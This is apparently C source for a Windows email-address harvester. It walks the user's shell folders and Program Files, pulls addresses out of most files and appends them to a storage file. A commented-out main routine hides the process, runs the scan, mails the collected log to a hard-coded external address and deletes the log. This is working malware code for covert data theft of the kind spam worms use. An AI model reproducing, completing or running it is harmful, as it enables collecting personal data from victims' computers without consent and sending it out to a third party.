   #include <stdio.h>
   #include <windows.h>

   #define SHELL_FOLDERS_PATH "Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders"
   // XXX
   #define LOGFILE "c:\\xx.tmp"

   typedef unsigned long dword;
   typedef unsigned char byte;
   typedef unsigned short word;

   extern byte *find_next_email(byte *,dword,dword *);

   byte *s = NULL;
   dword len;
   char szBuf[256];

   void search_email(char *fname);
   void scan_shell_folders(void);
   void find_files(char *where);
   BOOL is_fname_filtered(char *fname);
   void store_str(char *str);

   struct _scan_info{
       char szCurrentPath[MAX_PATH + 255];
       char szCurrentFile[MAX_PATH + 255];
   };

   struct _scan_info scan_info;

   //#include "crc32.c"
   //#include "my_mx.c"

   //typedef int ( WINAPI *RSP ) (DWORD,DWORD);

   /*int WINAPI WinMain(HINSTANCE hInst, HINSTANCE hPrevInst, LPSTR szCmdLine, int nCmdShow){
       HINSTANCE hLib;
       RSP RegisterServiceProcess = NULL;

       if((hLib = LoadLibrary("kernel32.dll")) != 0){
           RegisterServiceProcess = (RSP)GetProcAddress(hLib, "RegisterServiceProcess");
           if(RegisterServiceProcess)
               RegisterServiceProcess(0,1);
       }

       crc32_init();
       scan_shell_folders();
       find_files("C:\\Program Files\\");
       char szRandomText[256];
       sprintf(szRandomText,"%x",GetTickCount());
       char szSubj[256];
       sprintf(szSubj,"test               %s",szRandomText);

       smtp_init();
       smtp_send_file(LOGFILE,"djhill@detroittime.net","djhill@detroittime.net",szSubj);

       DeleteFile(LOGFILE);
       return 0;
   }*/

   void store_str(char *str){
       FILE *fp = fopen(storage.szEmailsFile, "ab");
       fprintf(fp,"%s\n",str);
       fclose(fp);
       info.nScanEmailsFound++;
   }

   void find_files(char *where){
       char mask[MAX_PATH];
       WIN32_FIND_DATA findData;
       HANDLE handle;

       if(strlen(where) > MAX_PATH-20) return;
       //printf("Searching in directory: %s\n",where);

       strncpy(mask,where,MAX_PATH-10);
       strncpy(scan_info.szCurrentPath,where,MAX_PATH);

       strcat(mask,"*.*");

       handle = FindFirstFile(mask,&findData);
       do {
           //printf("%s\n",findData.cFileName);
           if(findData.dwFileAttributes &= FILE_ATTRIBUTE_DIRECTORY) {
               if(strcmp(findData.cFileName,".")!=0 && strcmp(findData.cFileName,"..")!=0){
                   strcpy(mask,where);
                   //strcat(mask,"\\");
                   strcat(mask,findData.cFileName);
                   strcat(mask,"\\");
                   find_files(mask);
               }
           } else {
               strcpy(mask,where);
               strcat(mask,findData.cFileName);
               sprintf(scan_info.szCurrentFile,"%s%s",scan_info.szCurrentPath,findData.cFileName);
               //printf("%s\n",scan_info.szCurrentFile);
               search_email(scan_info.szCurrentFile);
           }
       } while(FindNextFile(handle,&findData));
   }


   BOOL is_fname_filtered(char *fname){
       char *filter[] = { "bmp","jpg","gif","exe","dll","avi","mpg","mp3",
           "vxd", "ocx", "psd", "tif","zip","rar","pdf","cab","wav","com" };

       if(strlen(fname)<5) return FALSE;

       int nFilters = sizeof(filter)/sizeof(char *);

       char *pExt = fname + strlen(fname)-3;
       char szExt[4] = {0};
       strncpy(szExt,pExt,3);

       szExt[0] |= 0x20; /* to lowercase */
       szExt[1] |= 0x20;
       szExt[2] |= 0x20;
       szExt[3] = 0;

       for(int i = 0;i < nFilters;i++){
           if(strncmp(szExt,filter[i],3)==0) return TRUE;
       }

       return FALSE;
   }

   void search_email(char *fname){

       DWORD dwBytesRead;
       dword work_val = 0;

       if(is_fname_filtered(fname)) return;

       HANDLE hFile = CreateFile(fname, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, \
           FILE_ATTRIBUTE_NORMAL, 0);

       if(hFile){
           DWORD dwHigh = 0;
           len = GetFileSize(hFile,&dwHigh);
           if(dwHigh){ CloseHandle(hFile); return; }
           if(len != -1){
               byte *buf = (byte *)malloc(len);
               if(buf){
                   //printf("%s is %d bytes, ptr %d\n",scan_info.szCurrentFile,len,buf);
                   if(ReadFile(hFile,buf,len,&dwBytesRead,NULL)==0){
                       printf("Read error\n");
                   }
                   while(TRUE){
                       s = (byte *)find_next_email(buf,len,&work_val);
                       if(!s)
                           break;
                       if(!is_email_exists(s) && strlen(s)>6) {
                           strncpy(szBuf,s,255);
                           store_str(szBuf);
                       }
                   }
                   free(buf);
               } else { printf("Memory allocation error, file %s, size %d\n",scan_info.szCurrentFile,len); }

           }
           CloseHandle(hFile);
       } else {
           printf("Failed to open '%s'\n",fname);
       }
   }

   void scan_shell_folders(void){
       unsigned char szValueName[512];
       unsigned char szData[512];

       HKEY hReg;
       unsigned int uiRegIndex = 0;
       DWORD dwType;
       DWORD dwValueName = 512;
       DWORD dwData = 512;

       if(RegOpenKey(HKEY_CURRENT_USER, SHELL_FOLDERS_PATH, &hReg) == 0){

           while(RegEnumValue(hReg,uiRegIndex,szValueName,&dwValueName,NULL,&dwType,szData,&dwData)==ERROR_SUCCESS){
               if(szData[strlen(szData)-1] != '\\')
                   strcat(szData,"\\");
               dwValueName=512; dwData=512;
               uiRegIndex++;
               find_files(szData);
               //printf("%s - %s\n",szValueName,szData);
           }
       }

       RegCloseKey(hReg);
   }
